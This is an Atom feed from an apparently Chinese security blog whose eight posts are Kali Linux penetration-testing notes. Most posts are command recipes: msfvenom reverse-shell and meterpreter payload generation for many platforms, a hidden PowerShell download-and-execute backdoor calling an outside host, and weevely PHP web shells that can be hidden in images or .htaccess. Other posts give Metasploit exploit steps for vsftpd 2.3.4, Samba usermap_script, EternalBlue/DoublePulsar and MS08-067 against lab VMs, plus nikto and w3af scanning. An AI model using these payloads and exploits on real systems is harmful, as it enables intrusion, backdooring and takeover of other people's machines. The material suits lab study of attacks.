<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>一日看尽长安花</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-12-07T11:44:48.685Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>南北_</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>msfvenom生成木马</title>
    <link href="http://yoursite.com/2019/12/07/%C2%96msfvenom%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC/"/>
    <id>http://yoursite.com/2019/12/07/%C2%96msfvenom%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC/</id>
    <published>2019-12-07T08:32:54.000Z</published>
    <updated>2019-12-07T11:44:48.685Z</updated>
    
    <content type="html"><![CDATA[<hr><p>msfvenom生成shellcode：</p><p>简单生成：</p><p>​        msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.157.133 LPORT=11111 -f exe -o /root/1.exe</p><p><img src="https://img.vim-cn.com/c5/d9c67375dd4c1ec02137b88be039e3235d8593.png" alt="1"></p><p>-p 指定payload，payload后跟该payload的选项</p><p>-o 指定payload的保存路径，包含文件名</p><p>替换指定代码：</p><p>​        msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.157.132 LPORT=11111 -b ‘\x00’ -f exe -o /root/1.exe</p><p><img src="https://img.vim-cn.com/e5/44e7181d3af7fe217e5e67a47a30a15673eb05.png" alt="2"></p><p>-b 替换代码中会出现中断的字符，如 ‘\x00\xff’</p><p>指定编码器：</p><p>​        msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.157.132 LPORT=11111 -b ‘\x00’ -e x86/shikata_ga_nai -f exe -o /root/1.exe</p><p><img src="https://img.vim-cn.com/21/1b62b1f8e53ab179dbd4da1cc31ebdd4651b65.png" alt="3"></p><p>-e 指定特定的编码器</p><p>Windows：</p><p>​        msfvenom –platform windows –a x86 –p windows/meterpreter/reverse_tcp –i 3 –e x86/shikata_ga_nai –f exe –o C:\back.exe<br>​        msfvenom –platform windows –a x86 –p windows/x64/meterpreter/reverse_tcp –f exe –o C:\back.exe</p><p>Linux：<br>        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf &gt; shell.elf</p><p>MAC：<br>        msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho &gt; shell.macho</p><p>PHP：<br>        msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.php</p><p>Asp：<br>        msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp &gt; shell.asp</p><p>Aspx：<br>        msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f aspx &gt; shell.aspx</p><p>JSP：<br>        msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.jsp</p><p>War：<br>        msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war &gt; shell.war</p><p>Bash：<br>        msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On>-f raw &gt; shell.sh</p><p>Perl：<br>        msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.pl</p><p>Python：<br>        msfvenom -p python/meterpreter/reverser_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.py</p><p>exe 利用exec执行powershell后门:<br>        msfvenom -p windows/exec CMD=”powershell.exe -nop -w hidden -c $M=new-object net.webclient;$M.proxy=[Net.WebRequest]::GetSystemWebProxy();$M.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $M.downloadstring(‘<a href="http://192.168.157.132:8080/4WFjDXrGo7Mj&#39;);&quot;" target="_blank" rel="noopener">http://192.168.157.132:8080/4WFjDXrGo7Mj&#39;);&quot;</a> -f exe -e x86/shikata_ga_nai -i 6 -o msf.exe</p><p>列出所有可用的攻击载荷：</p><p><img src="https://img.vim-cn.com/c2/49f2ba4a8a0f6e4acfc59020d5afc09a4487be.png" alt="11"></p><p>列出Windows平台下最为常见的payload个数：</p><p><img src="https://img.vim-cn.com/0e/2fb66bcd14658adcccac4655538c0855ccc2e8.png" alt="12"></p><p>查看excellent级的编码方式：</p><p><img src="https://img.vim-cn.com/44/ae0116860d8ecfc3da9437fd12277446ef9bc9.png" alt="13"></p><p>查看nops（空字段）选项：</p><p><img src="https://img.vim-cn.com/18/2597fd7c59b384d8434645424863747519faae.png" alt="14"></p><p>查看可以生产的格式：</p><p><img src="https://img.vim-cn.com/eb/bd7b4f8c70a6e7ec356bc4b9314046884282bf.png" alt="15"></p><p>查看当前支持的平台：</p><p><img src="https://img.vim-cn.com/13/ac42cb17ab0e5944e070b68a6469ea1e6223d1.png" alt="16"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;p&gt;msfvenom生成shellcode：&lt;/p&gt;
&lt;p&gt;简单生成：&lt;/p&gt;
&lt;p&gt;​        msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.157.133 LPORT=11111 -f e
      
    
    </summary>
    
    
    
      <category term="工具" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>weevely</title>
    <link href="http://yoursite.com/2019/12/07/weevely/"/>
    <id>http://yoursite.com/2019/12/07/weevely/</id>
    <published>2019-12-07T07:54:50.000Z</published>
    <updated>2019-12-07T08:16:47.876Z</updated>
    
    <content type="html"><![CDATA[<hr><p>基本命令格式：</p><p><img src="https://img.vim-cn.com/7a/c114a0d32b2c2c0ef43d48e9bfbb1f8ba34b4a.png" alt="1"></p><p>后门生成参数：</p><p>​        generate.php（生成php后门文件）</p><p>​        generate.img（将后门代码插入到图片中，并修改.htaccess，该后门需要服务器开启.htaccess）</p><p>​        generate.htaccess（将后门代码插入到.htaccess，同样需要开启.htaccess支持）</p><p>weevely generate <password> <path>            新建一个远程控制文件，文件使用密码password，path为生成的文件位置</p><p>weevely session <path>         连接一个曾经连接过的session会话</p><p>weevely <URL> <password>        连接一个远程的URL开启远程控制，使用远程控制文件密码password</p><p>使用.php文件远程控制</p><p><img src="https://img.vim-cn.com/15/05568906ae9c1a3841d09b1dc583bd934de272.png" alt="2"></p><p>将该backdoor.php文件通过方法移动到Apache2服务器的根目录/var/www/html/</p><p><img src="https://img.vim-cn.com/9b/e339795ed2afaa2227f4ac5da69a8f63e18b92.png" alt="3"></p><p>通过weevely命令进行连接我们的远程控制文件（文件密码为字符串hello）</p><p><img src="https://img.vim-cn.com/b7/1dcc604547227395b16820a7897045de6b2fa5.png" alt="4"></p><p>可以看到渗透成功，并且可以执行命令了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;p&gt;基本命令格式：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img.vim-cn.com/7a/c114a0d32b2c2c0ef43d48e9bfbb1f8ba34b4a.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;p&gt;后门生成参数：&lt;/p&gt;
&lt;p&gt;​     
      
    
    </summary>
    
    
    
      <category term="工具" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>nikto</title>
    <link href="http://yoursite.com/2019/12/07/nikto/"/>
    <id>http://yoursite.com/2019/12/07/nikto/</id>
    <published>2019-12-07T07:26:15.000Z</published>
    <updated>2019-12-07T07:44:09.903Z</updated>
    
    <content type="html"><![CDATA[<hr><p>使用nikto进行Web扫描测试：</p><p>​    靶机：Metasploitable （192.168.157.133）</p><p>​    攻击机：Kali  2.0（192.168.157.132）</p><p>1.普通扫描</p><p>nikto -h 目标</p><p><img src="https://img.vim-cn.com/ac/12d5a89d85486fa46c065aaff274d7b102a691.png" alt="1"></p><p>2.扫描指定端口</p><p>nikto -h 目标 -p 端口</p><p><img src="https://img.vim-cn.com/f3/78b5570c051f4f3b99848ce8ee11d7aac997d1.png" alt="2"></p><p>3.目录猜解</p><p>-C 指定CGI目录 –all表示猜解CGI目录</p><p>nikto -h 192.168.157.133 -C all</p><p><img src="https://img.vim-cn.com/79/3e9745016f7630ae539857267ef0c2d9b35fc6.png" alt="3"></p><p>4.漏洞扫描</p><p>-T选项包含很多小选项 <code>–T</code> <code>9</code>表示扫描<code>SQL</code>注入漏洞<br>-T选项包含的小选项解释：<br>0 检查文件上传页面<br>1 检查<code>web</code>日志<br>2 检查错误配置或默认文件<br>3检查信息泄露问题<br>4 检查<code>XSS/Script/HTML</code>问题<br>5 从根目录检查是否存在可访问的文件<br>6 检查拒绝服务问题<br>7 从任意文件检索是否存在可访问文件<br>8 检查是否存在系统命令执行漏洞<br>9 检查<code>SQL注入</code>漏洞<br>a 检查认证绕过问题<br>b 识别安装的软件版本<br>c 检查源代码泄露问题<br>x 反向链接选项</p><p>例如：扫描sql注入漏洞</p><p>nikto -h 192.168.157.133 -T 9</p><p><img src="https://img.vim-cn.com/8a/91a0abd2d6526e7f81ff05076c39a6461748fd.png" alt="4"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;p&gt;使用nikto进行Web扫描测试：&lt;/p&gt;
&lt;p&gt;​    靶机：Metasploitable （192.168.157.133）&lt;/p&gt;
&lt;p&gt;​    攻击机：Kali  2.0（192.168.157.132）&lt;/p&gt;
&lt;p&gt;1.普通扫描&lt;/p&gt;
&lt;p&gt;ni
      
    
    </summary>
    
    
    
      <category term="工具" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>w3af命令行模式</title>
    <link href="http://yoursite.com/2019/12/07/w3af%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%A8%A1%E5%BC%8F/"/>
    <id>http://yoursite.com/2019/12/07/w3af%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%A8%A1%E5%BC%8F/</id>
    <published>2019-12-07T06:02:27.000Z</published>
    <updated>2019-12-07T07:08:41.178Z</updated>
    
    <content type="html"><![CDATA[<hr><hr><p>使用w3af进行Web应用安全漏洞测试：</p><p>​    靶机：Metasploitable （192.168.157.133）</p><p>​    攻击机：Kali  2.0（192.168.157.132）</p><p>1.首先打开Kali 2.0终端输入w3af_console进入w3af命令行模式</p><p><img src="https://img.vim-cn.com/16/3de2f11d238db59150ac279d86b38000844b4b.png" alt="0"></p><p>2.help命令列出当前命令提示符下可用的命令</p><p><img src="https://img.vim-cn.com/4f/67a46f9feec6ebb4483bff9862db51453d7073.png" alt="1"></p><p>start         | Start the scan.    开始扫描</p><p>plugins       | Enable and configure plugins.    选择和配置插件</p><p>exploit       | Exploit the vulnerability.    使用该模块进行攻击漏洞</p><p>profiles      | List and use scan profiles.    列出可以用来扫描的文件</p><p>cleanup       | Cleanup before starting a new scan.    在开始新扫描之前进行清理 </p><p>version       | Show w3af version information.    显示w3af版本信息 </p><p>keys          | Display key shortcuts.    显示关键快捷方式</p><p>http-settings | Configure the HTTP settings of the framework.    配置框架的HTTP设置</p><p>misc-settings | Configure w3af misc settings.    配置w3af misc设置</p><p>target        | Configure the target URL.    配置目标URL</p><p>back          | Go to the previous menu.    返回前一目录</p><p>exit          | Exit w3af.    退出</p><p>kb            | Browse the vulnerabilities stored in the Knowledge Base    浏览存储在知识库中的漏洞</p><p>3.输入plugins，进入插件目录内，输入help显示当前可使用的命令</p><p><img src="https://img.vim-cn.com/e7/e9edb430dff3d0b78d0e7e25e0ee611ecbc2d3.png" alt="2"></p><p>4.输入list audit列出audit插件类中的小插件</p><p><img src="https://img.vim-cn.com/d1/c01a732b8e6b052b0f1ad03af4616da0d86b6b.png" alt="3"></p><p>5.使用audit模块中的xss脚本攻击,sql注入,本地文件调用这三个插件,可以选用一个,也可以选用多个</p><p><img src="https://img.vim-cn.com/55/b2325a235259f1b3c74d9b0aaa277981279458.png" alt="4"></p><p>6.使用audit模块中所有的插件进行扫描</p><p><img src="https://img.vim-cn.com/ab/f0c982be5976f2ef1db412f69ccbccc5a4b9d1.png" alt="5"></p><p>7.输入crawl模块，按两次tab键，可以显示该模块下的插件，选择该模式下的web爬虫模块</p><p><img src="https://img.vim-cn.com/d2/723195423fb79bf0d8ca814b21e1631d14c61a.png" alt="6"></p><p>8.进入profiles模块，这个模块用于自定义组合插件，当然w3af自定义了一些组合插件</p><p><img src="https://img.vim-cn.com/16/539e19e801753e770567f944ef27266c85c42b.png" alt="7"></p><p>9.列出在profiles模块下的插件</p><p><img src="https://img.vim-cn.com/af/9d55984dbc05ff4c8dcdde1ad55b1558d10c5d.png" alt="8"></p><p>10.下面我们来用一下这些自定义插件</p><p><img src="https://img.vim-cn.com/29/d0dfd113d13592e1042fd91bda95204f4ec6f0.png" alt="9"></p><p>save_as test    使用save_as后面自定义一个文件名,表示将刚刚的配置存放在test文件内</p><p>save_as test self-contained    将test文件独立出来,以便供其他人使用</p><p>use test    使用自定义的test文件中的配置进行扫描</p><p>back    返回上一级</p><p>11.进入http-settings，设置全局参数</p><p><img src="https://img.vim-cn.com/56/c6f4645fafd4b9aacb08f399dffaf66e55a0a8.png" alt="10"></p><p>set    | Set a parameter value.    设置参数值</p><p>save   | Save the configured settings.    保存配置</p><p>set rand_user_agent True    设置随机用户代理浏览器,默认位w3af的代理,容易被管理员查看日志发现</p><p>12.进入misc-setting全局设置选项中</p><p><img src="https://img.vim-cn.com/ec/f75580f3f2eb51267e8a38a23f0068deaf3ac6.png" alt="11"></p><p>view    查看需要配置的参数</p><p><img src="https://img.vim-cn.com/38/38c14b10664f6090b97fe9cac422c6af5c18f3.png" alt="12"></p><p>set fuzz_url_filenames True    设置对URL中的文件名进行模糊测试(Fuzz)</p><p>13.进入target模块，设置目标信息，输入help查看在此模式下可使用的命令</p><p><img src="https://img.vim-cn.com/aa/f812283ea969ef8dddbc448938881e5b72a6b5.png" alt="13"></p><p>view    列出可用操作</p><p><img src="https://img.vim-cn.com/12/5f6f20f515c4d84e04ba7b4707b65174007595.png" alt="14"></p><p>set target http：//192.168.157.133    设置目标URL</p><p>set target_os unix    设置目标系统为unix</p><p>back    返回上级目录</p><p>start    开始扫描</p><p>Apache和PHP的版本也就被爆出来了，是不是很屌呢</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;hr&gt;
&lt;p&gt;使用w3af进行Web应用安全漏洞测试：&lt;/p&gt;
&lt;p&gt;​    靶机：Metasploitable （192.168.157.133）&lt;/p&gt;
&lt;p&gt;​    攻击机：Kali  2.0（192.168.157.132）&lt;/p&gt;
&lt;p&gt;1.首先打开Ka
      
    
    </summary>
    
    
    
      <category term="工具" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Linux笑脸漏洞渗透</title>
    <link href="http://yoursite.com/2019/12/07/Linux%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F/"/>
    <id>http://yoursite.com/2019/12/07/Linux%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F/</id>
    <published>2019-12-07T03:11:39.000Z</published>
    <updated>2019-12-07T04:48:27.093Z</updated>
    
    <content type="html"><![CDATA[<hr><p>通过vsftpd_234_backdoor学习msf对渗透的利用：（可攻击系统为vsftpd version 2到2.3.4）</p><p>​    靶机：Linux（192.168.157.133）</p><p>​    攻击机：Kali （192.168.157.132）</p><p>1.使用-p-对靶机进行扫描，查看有哪些端口漏洞(vsftpd_234_backdoor对应的漏洞端口为21)</p><p><img src="https://img.vim-cn.com/6b/041a673e71a5f391308868375a4a240b5a3eee.png" alt="0"></p><p>2.输入msfconsole进入搜索MS08_067可利用漏洞模块</p><p><img src="https://img.vim-cn.com/0b/d8b6d85b715d025d3998288986d3333f4cd04d.png" alt="1"></p><p>3.利用漏洞模块，设置参数</p><p>msf5 &gt; use exploit/unix/ftp/vsftpd_234_backdoor</p><p>msf5 &gt; show optins</p><p>msf5 &gt; set RHOSTS 192.168.157.133</p><p>msf5 &gt; exploit</p><p><img src="https://img.vim-cn.com/09/05eb9c6ee17c26a22e8615f03ab5c8995a3c84.png" alt="3"></p><p>可以看到漏洞利用成功，现在是 root最高权限,就可以对靶机进行为所欲为了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;p&gt;通过vsftpd_234_backdoor学习msf对渗透的利用：（可攻击系统为vsftpd version 2到2.3.4）&lt;/p&gt;
&lt;p&gt;​    靶机：Linux（192.168.157.133）&lt;/p&gt;
&lt;p&gt;​    攻击机：Kali （192.168.
      
    
    </summary>
    
    
    
      <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Linux通过smb服务渗透</title>
    <link href="http://yoursite.com/2019/12/07/Linux%E9%80%9A%E8%BF%87smb%E6%9C%8D%E5%8A%A1%E6%B8%97%E9%80%8F/"/>
    <id>http://yoursite.com/2019/12/07/Linux%E9%80%9A%E8%BF%87smb%E6%9C%8D%E5%8A%A1%E6%B8%97%E9%80%8F/</id>
    <published>2019-12-07T02:35:44.000Z</published>
    <updated>2019-12-07T03:05:49.273Z</updated>
    
    <content type="html"><![CDATA[<hr><p>通过usermap_script学习msf对渗透的利用：（可攻击系统为Linux3.X-4.X的SMB）</p><p>​    靶机：Linux （192.168.157.133）</p><p>​    攻击机：Kali （192.168.157.132）</p><p>1.使用-p-对靶机进行扫描，查看有哪些端口漏洞(usermap_script对应的漏洞端口为139)</p><p><img src="https://img.vim-cn.com/f3/6297564f2a925e08b5139933e5f2b98768490b.png" alt="0"></p><p>2.输入msfconsole进入搜索usermap_script可利用漏洞模块</p><p><img src="https://img.vim-cn.com/c4/7bcb59b0810fa449898cc0993833aa020b2b6d.png" alt="1"></p><p>3.利用漏洞模块，设置参数</p><p>msf5 &gt; use exploit/multi/samba/usermap_script</p><p>msf5 &gt; set RHOSTS 192.168.157.133</p><p>msf5 &gt; show options</p><p>msf5 &gt; exploit</p><p><img src="https://img.vim-cn.com/4c/249d555732f74e6a56d48b444fa118457c3577.png" alt="2"></p><p>可以看到漏洞利用成功，现在是 root最高权限,就可以对靶机进行为所欲为了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;p&gt;通过usermap_script学习msf对渗透的利用：（可攻击系统为Linux3.X-4.X的SMB）&lt;/p&gt;
&lt;p&gt;​    靶机：Linux （192.168.157.133）&lt;/p&gt;
&lt;p&gt;​    攻击机：Kali （192.168.157.132）&lt;/
      
    
    </summary>
    
    
    
      <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>双脉冲星渗透</title>
    <link href="http://yoursite.com/2019/12/06/%E5%8F%8C%E8%84%89%E5%86%B2%E6%98%9F%E6%B8%97%E9%80%8F/"/>
    <id>http://yoursite.com/2019/12/06/%E5%8F%8C%E8%84%89%E5%86%B2%E6%98%9F%E6%B8%97%E9%80%8F/</id>
    <published>2019-12-06T05:16:39.000Z</published>
    <updated>2019-12-07T01:30:23.994Z</updated>
    
    <content type="html"><![CDATA[<hr><p>通过双脉冲星学习msf对渗透的利用：（除win10以外的系统均可攻击）</p><p>​    靶机：Windows xp（192.168.124.108）</p><p>​    攻击机：Kali （192.168.124.106）</p><p>1.使用-p-对靶机进行扫描，查看有哪些端口漏洞(08_067对应的漏洞端口为445)</p><p><img src="https://img.vim-cn.com/35/9f86370c1ecd0a4c69d7fcc4077b5040b9fd9f.png" alt="0"></p><p>2.将模块复制到msf目录下</p><p><img src="https://img.vim-cn.com/76/e6b5aba18e2929a10828f2fca2d53dfba77b40.png" alt="1"></p><p>3.输入msfconsole进入搜索eternalblue_doublepulsar可利用漏洞模块</p><p><img src="https://img.vim-cn.com/af/e592e20e35b916d5ea2824b879d968a6c998ea.png" alt="2"></p><p>4.利用漏洞模块，设置参数</p><p>msf &gt; use exploit/windows/smb/eternalblue_doublepulsar</p><p>msf &gt; set RHOST 192.168.124.108</p><p>msf &gt; set payload windows/meterpreter/reverse_tcp</p><p>msf &gt; set LHOST 192.168.124.1006</p><p>msf &gt; set DOUBLEPULSARPATH /usr/share/metasploit-framework/modules/exploits/windows/smb/deps</p><p>msf &gt; set ETERNALBLUEPATH /usr/share/metasploit-framework/modules/exploits/windows/smb/deps</p><p>msf &gt; set PROCESSINJECT lsass.exe</p><p><img src="https://img.vim-cn.com/39/e8d2ff9ef700954b9577f0479de861e2cea686.png" alt="6"></p><p>可以看到漏洞利用成功，现在是 system 最高权限,就可以对靶机进行为所欲为了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;p&gt;通过双脉冲星学习msf对渗透的利用：（除win10以外的系统均可攻击）&lt;/p&gt;
&lt;p&gt;​    靶机：Windows xp（192.168.124.108）&lt;/p&gt;
&lt;p&gt;​    攻击机：Kali （192.168.124.106）&lt;/p&gt;
&lt;p&gt;1.使用-p-
      
    
    </summary>
    
    
    
      <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>MS08_067渗透</title>
    <link href="http://yoursite.com/2019/12/06/MS08-067%E6%B8%97%E9%80%8F/"/>
    <id>http://yoursite.com/2019/12/06/MS08-067%E6%B8%97%E9%80%8F/</id>
    <published>2019-12-06T04:30:16.000Z</published>
    <updated>2019-12-06T05:12:35.008Z</updated>
    
    <content type="html"><![CDATA[<hr><p>通过MS08_067学习msf对渗透的利用：（可攻击系统为xp和Windows2003）</p><p>​    靶机：Windows xp （192.168.124.15）</p><p>​    攻击机：Kali （192.168.124.99）</p><p>1.使用-p-对靶机进行扫描，查看有哪些端口漏洞(08_067对应的漏洞端口为445)</p><p><img src="https://img.vim-cn.com/35/9f86370c1ecd0a4c69d7fcc4077b5040b9fd9f.png" alt="0"></p><p>2.输入msfconsole进入搜索MS08_067可利用漏洞模块</p><p><img src="https://img.vim-cn.com/87/d2e5060c076b7a604d6ac3591fb8f3176cf34d.png" alt="1"></p><p>3.利用漏洞模块，设置参数</p><p>msf5 &gt; use exploit/windows/smb/ms08_067_netapi</p><p>msf5 &gt; set RHOSTS 192.168.124.15</p><p>msf5 &gt; set payload windows/meterpreter/reverse_tcp</p><p>msf5 &gt; set LHOST 192.168.124.99</p><p>msf5 &gt; set target 34</p><p>msf5 &gt; exploit</p><p><img src="https://img.vim-cn.com/f3/78a38c95cbb937494fe1bc145ff2f3fff769c1.png" alt="2"></p><p>可以看到漏洞利用成功，现在是 system 最高权限,就可以对靶机进行为所欲为了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;p&gt;通过MS08_067学习msf对渗透的利用：（可攻击系统为xp和Windows2003）&lt;/p&gt;
&lt;p&gt;​    靶机：Windows xp （192.168.124.15）&lt;/p&gt;
&lt;p&gt;​    攻击机：Kali （192.168.124.99）&lt;/p&gt;
&lt;p
      
    
    </summary>
    
    
    
      <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>MS17_010渗透</title>
    <link href="http://yoursite.com/2019/12/06/MS17_010%E6%B8%97%E9%80%8F/"/>
    <id>http://yoursite.com/2019/12/06/MS17_010%E6%B8%97%E9%80%8F/</id>
    <published>2019-12-06T02:14:36.000Z</published>
    <updated>2019-12-06T04:38:07.887Z</updated>
    
    <content type="html"><![CDATA[<hr><p>通过MS17_010学习msf对渗透的利用：（可攻击系统为Win7和Windows2008）</p><p>​    靶机：Windows 7 （192.168.157.135）</p><p>​    攻击机：Kali （192.168.157.132）</p><p>1.使用-p-对靶机进行扫描，查看有哪些端口漏洞(17_010对应的漏洞端口为445)</p><p><img src="https://img.vim-cn.com/db/e190eb3c34d3688891f1a9a23ee3749d404023.png" alt="0"></p><p>2.输入msfconsole进入搜索MS17_010可利用漏洞模块</p><p><img src="https://img.vim-cn.com/b0/9e43fdcbbc88bf3211ce12ea5cc1bc9004bda1.png" alt="1"></p><p>3.利用漏洞模块，设置参数</p><p>msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue</p><p>msf5 &gt; set RHOSTS 192.168.157.135</p><p>msf5 &gt; set payload windows/x64/meterpreter/reverse_tcp</p><p>msf5 &gt; set LHOST 192.168.157.132</p><p>msf5 &gt; exploit</p><p><img src="https://s2.ax1x.com/2019/12/06/QJQ19H.png" alt="3"></p><p>可以看到漏洞利用成功，现在是 system 最高权限,就可以对靶机进行为所欲为了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;p&gt;通过MS17_010学习msf对渗透的利用：（可攻击系统为Win7和Windows2008）&lt;/p&gt;
&lt;p&gt;​    靶机：Windows 7 （192.168.157.135）&lt;/p&gt;
&lt;p&gt;​    攻击机：Kali （192.168.157.132）&lt;/p&gt;
      
    
    </summary>
    
    
    
      <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
</feed>
